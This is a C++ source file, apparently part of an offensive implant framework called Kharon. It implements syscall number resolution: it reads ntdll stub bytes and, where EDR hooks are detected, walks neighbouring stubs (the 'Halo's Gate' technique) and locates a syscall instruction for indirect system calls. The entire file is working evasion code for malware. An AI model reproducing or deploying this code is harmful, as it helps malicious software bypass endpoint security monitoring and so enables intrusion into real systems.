#include <Kharon.h>

auto DECLFN Syscall::Fetch(
    _In_ INT8 SysIdx
) -> BOOL {
    UPTR FuncPtr = this->Ext[SysIdx].Address;

    // not hooked
    if ( 
         DEFB( FuncPtr + 0 ) == 0x4C &&
         DEFB( FuncPtr + 1 ) == 0x8B &&
         DEFB( FuncPtr + 2 ) == 0xD1 &&
         DEFB( FuncPtr + 3 ) == 0xB8 &&
         DEFB( FuncPtr + 6 ) == 0x00 &&
         DEFB( FuncPtr + 7 ) == 0x00 
    ) {
        BYTE High = DEFB( FuncPtr + 5 );
        BYTE Low  = DEFB( FuncPtr + 4 );
        this->Ext[SysIdx].ssn = ( High << 8 ) | Low;
        goto _KH_END;
    }

    // if hooked - case 1
    if ( DEFB( FuncPtr ) == 0xE9 ) {
        for ( INT i = 1; i <= SY_RANGE; i++ ) {
            if ( 
                 DEFB( FuncPtr + 0 + i * SY_DOWN ) == 0x4C &&
                 DEFB( FuncPtr + 1 + i * SY_DOWN ) == 0x8B &&
                 DEFB( FuncPtr + 2 + i * SY_DOWN ) == 0xD1 &&
                 DEFB( FuncPtr + 3 + i * SY_DOWN ) == 0xB8 &&
                 DEFB( FuncPtr + 6 + i * SY_DOWN ) == 0x00 &&
                 DEFB( FuncPtr + 7 + i * SY_DOWN ) == 0x00 
           ) {
               BYTE High = DEFB( FuncPtr + 5 + i * SY_DOWN );
               BYTE Low  = DEFB( FuncPtr + 4 + i * SY_DOWN );
               this->Ext[SysIdx].ssn = ( High << 8 ) | Low - i;
               goto _KH_END;
           }
           
            if ( 
                 DEFB( FuncPtr + 0 + i * SY_UP ) == 0x4C &&
                 DEFB( FuncPtr + 1 + i * SY_UP ) == 0x8B &&
                 DEFB( FuncPtr + 2 + i * SY_UP ) == 0xD1 &&
                 DEFB( FuncPtr + 3 + i * SY_UP ) == 0xB8 &&
                 DEFB( FuncPtr + 6 + i * SY_UP ) == 0x00 &&
                 DEFB( FuncPtr + 7 + i * SY_UP ) == 0x00 
            ) {
                BYTE High = DEFB( FuncPtr + 5 + i * SY_UP );
                BYTE Low  = DEFB( FuncPtr + 4 + i * SY_UP );
                this->Ext[SysIdx].ssn = ( High << 8 ) | Low + i;
                goto _KH_END;
            }
        }
    }

    // if hooked - case 2
    if ( DEFB( FuncPtr + 3 ) == 0xE9 ) {
        for ( INT i = 0; i <= SY_RANGE; i++ ) {
            if ( 
                DEFB( FuncPtr + 0 + i * SY_DOWN ) == 0x4C &&
                DEFB( FuncPtr + 1 + i * SY_DOWN ) == 0x8B &&
                DEFB( FuncPtr + 2 + i * SY_DOWN ) == 0xD1 &&
                DEFB( FuncPtr + 3 + i * SY_DOWN ) == 0xB8 &&
                DEFB( FuncPtr + 6 + i * SY_DOWN ) == 0x00 &&
                DEFB( FuncPtr + 7 + i * SY_DOWN ) == 0x00 
            ) {
                BYTE High = DEFB( FuncPtr + 5 + i * SY_DOWN );
                BYTE Low  = DEFB( FuncPtr + 4 + i * SY_DOWN );
                this->Ext[SysIdx].ssn = ( High << 8 ) | Low - i;
                goto _KH_END;
            }

            if ( 
                DEFB( FuncPtr + 0 + i * SY_UP ) == 0x4C &&
                DEFB( FuncPtr + 1 + i * SY_UP ) == 0x8B &&
                DEFB( FuncPtr + 2 + i * SY_UP ) == 0xD1 &&
                DEFB( FuncPtr + 3 + i * SY_UP ) == 0xB8 &&
                DEFB( FuncPtr + 6 + i * SY_UP ) == 0x00 &&
                DEFB( FuncPtr + 7 + i * SY_UP ) == 0x00 
            ) {
                BYTE High = DEFB( FuncPtr + 5 + i * SY_UP );
                BYTE Low  = DEFB( FuncPtr + 4 + i * SY_UP );
                this->Ext[SysIdx].ssn = ( High << 8 ) | Low + i;
                goto _KH_END;
            }
        }
    }

_KH_END:
    for ( INT x = 0, y = 1; x <= SY_RANGE; x++, y++ ) {
        if ( DEFB( FuncPtr + x ) == 0x0F && DEFB( FuncPtr + y ) == 0x05 ) {
            this->Ext[SysIdx].Instruction = U_PTR( FuncPtr + x ); break;
        }
    }

    if   ( this->Ext[SysIdx].ssn && this->Ext[SysIdx].Address && this->Ext[SysIdx].Instruction ) return TRUE;
    else return FALSE;
}
